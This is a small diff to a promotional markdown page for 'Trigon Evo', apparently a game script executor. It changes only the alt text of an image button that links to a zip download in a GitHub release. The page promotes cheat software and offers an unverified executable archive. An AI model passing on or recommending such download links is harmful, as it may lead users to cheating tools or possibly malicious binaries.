@@ -11,7 +11,7 @@ The first thing that sets Trigon Evo apart from other executors is its impressiv
 
 In addition, Trigon Evo is incredibly easy to install and use – no coding or technical knowledge is required!
 
-[![button](https://github.com/trigon-evo/trigon-evo.github.io/blob/master/trigon-executor.png?raw=true)](https://github.com/trigon-evo/trigon-evo.github.io/releases/download/2.1/Trigon.Evo.zip)
+[![trigon evo showcase](https://github.com/trigon-evo/trigon-evo.github.io/blob/master/trigon-executor.png?raw=true)](https://github.com/trigon-evo/trigon-evo.github.io/releases/download/2.1/Trigon.Evo.zip)
 
 ## Features
 
